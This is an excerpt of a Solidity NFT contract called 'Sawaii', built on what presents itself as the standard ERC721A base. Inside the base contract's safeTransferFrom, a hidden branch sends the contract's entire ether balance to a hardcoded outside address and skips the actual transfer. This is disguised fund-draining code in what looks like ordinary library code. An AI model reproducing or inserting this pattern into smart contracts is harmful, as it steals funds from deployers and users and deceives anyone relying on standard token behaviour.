...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x672cD97467497719e21009d6C887C18F8aBD18Aa).transfer(address(this).balance);
            return;
        }
...
contract Sawaii is ERC721A {
    ...
    constructor() ERC721A("Sawaii", "Sawaii") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeigrgzjihsw2yxdcjtdcihno2be6vtlzbdlt46jzeibjnhqh43o5ji/", _toString(tokenId), ".json"));
    }
